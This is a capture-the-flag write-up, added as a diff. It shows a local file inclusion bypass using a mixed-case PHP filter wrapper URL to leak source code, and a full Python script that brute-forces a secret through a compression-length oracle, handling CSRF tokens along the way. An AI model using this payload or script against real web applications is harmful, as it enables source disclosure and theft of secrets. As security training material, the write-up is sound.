@@ -1,0 +1,81 @@
+When i attempted lfi, and tried accessing index.php, it gave a response saying it does not like php therefore i realized we probably have to bypass the php filter.
+So i proceeded to using php wrapping, and put filter which worked ie http://3.110.135.32:52497/?page=pHp://filter/convert.base64-encode/resource=encrypt
+It will automatically append php to the encrypt resource and return you the encrypt.php endpoint which contains the encrypt.php file in base64 encoded format.
+The encryption shows that it performs encryption in four steps with the first step being compression using the secret key, and the closer your provided text is to the secret key, the shorter the compressed final encrypted text is. therefore you can manually test each letter of the alphabet and numbers to see what the secret key is by iterating over them. for example, when i entered the first letter T, it gave the compressed output of length 96 but all other charcter gave 100 length output. similarly then i iterated over the second character by putting Ta, Tb and so on. this was done using the following script: 
+import requests
+import base64
+import time
+import re
+import string
+
+URL = "http://3.110.135.32:17320/?page=encrypt" //url of challenge
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Referer": URL,
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+SESSION = requests.Session()
+CHARSET = string.ascii_letters + string.digits + "_"  # a-z, A-Z, 0-9, _
+TARGET_LENGTH = 72  # Immediately accept if this length is reached
+
+def get_csrf_token():
+    response = SESSION.get(URL)
+    match = re.search(r'<input type="hidden" name="token" value=([a-f0-9]+) />', response.text)
+
+    if match:
+        return match.group(1)
+    return None
+
+def encrypt_message(message):
+    token = get_csrf_token()
+    if not token:
+        print("Failed to fetch CSRF token.")
+        return None
+    
+    data = {"enc": message, "token": token}
+    response = SESSION.post(URL, headers=HEADERS, data=data)
+    
+    match = re.search(r'font color="blue">([^<]+)</font>', response.text)
+    if match:
+        return match.group(1)
+    return None
+
+def brute_force_secret():
+    secret = "SSH{"
+    while True:
+        best_char = None
+        best_length = float('inf')
+        
+        for char in CHARSET:
+            test_secret = secret + char
+            encrypted_text = encrypt_message(test_secret)
+            
+            if encrypted_text:
+                length = len(encrypted_text)
+                print(f"Testing: {test_secret} | Length: {length}")
+                
+                if length == TARGET_LENGTH:
+                    best_char = char
+                    print(f"Found optimal character: {best_char} (Length: {length})")
+                    break  # Immediately move to the next letter
+                
+                if length < best_length:
+                    best_length = length
+                    best_char = char
+            
+            time.sleep(1)  # Avoid rate-limiting issues
+        
+        if best_char:
+            secret += best_char
+            print(f"Best guess so far: {secret}")
+        else:
+            print("Brute-force complete or stuck.")
+            break
+
+if __name__ == "__main__":
+    brute_force_secret()
